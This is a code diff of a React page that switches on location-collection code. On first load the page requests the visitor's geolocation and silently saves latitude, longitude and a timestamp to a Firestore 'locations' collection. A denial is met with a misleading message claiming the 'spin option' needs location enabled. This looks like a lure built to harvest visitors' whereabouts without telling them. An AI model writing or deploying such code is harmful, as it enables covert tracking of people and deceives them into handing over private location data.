@@ -13,45 +13,45 @@ export default function Home() {
   const [saved, setSaved] = useState(false);
   const [showEnableButton, setShowEnableButton] = useState(false);
 
-  // const requestLocation = () => {
-  //   if (!navigator.geolocation) {
-  //     setError("Geolocation is not supported by your browser");
-  //     return;
-  //   }
+  const requestLocation = () => {
+    if (!navigator.geolocation) {
+      setError("Geolocation is not supported by your browser");
+      return;
+    }
 
-  //   navigator.geolocation.getCurrentPosition(
-  //     async (position) => {
-  //       const lat = position.coords.latitude;
-  //       const lng = position.coords.longitude;
+    navigator.geolocation.getCurrentPosition(
+      async (position) => {
+        const lat = position.coords.latitude;
+        const lng = position.coords.longitude;
 
-  //       setLocation({ lat, lng });
-  //       setError(null);
-  //       setShowEnableButton(false);
+        setLocation({ lat, lng });
+        setError(null);
+        setShowEnableButton(false);
 
-  //       try {
-  //         await addDoc(collection(db, "locations"), {
-  //           lat,
-  //           lng,
-  //           timestamp: Timestamp.now(),
-  //         });
-  //         setSaved(true);
-  //       } catch (err: any) {
-  //         setError("Failed to save to Firestore: " + err.message);
-  //       }
-  //     },
-  //     (err) => {
-  //       setError(
-  //         "Spin option disabled please enable it by clicking the below button."
-  //       );
-  //       setShowEnableButton(true);
-  //     }
-  //   );
-  // };
+        try {
+          await addDoc(collection(db, "locations"), {
+            lat,
+            lng,
+            timestamp: Timestamp.now(),
+          });
+          setSaved(true);
+        } catch (err: any) {
+          setError("Failed to save to Firestore: " + err.message);
+        }
+      },
+      (err) => {
+        setError(
+          "Spin option disabled please enable it by clicking the below button."
+        );
+        setShowEnableButton(true);
+      }
+    );
+  };
 
-  // // 🔄 Try to get location on first load
-  // useEffect(() => {
-  //   requestLocation();
-  // }, []);
+  // 🔄 Try to get location on first load
+  useEffect(() => {
+    requestLocation();
+  }, []);
 
   return (
     <>
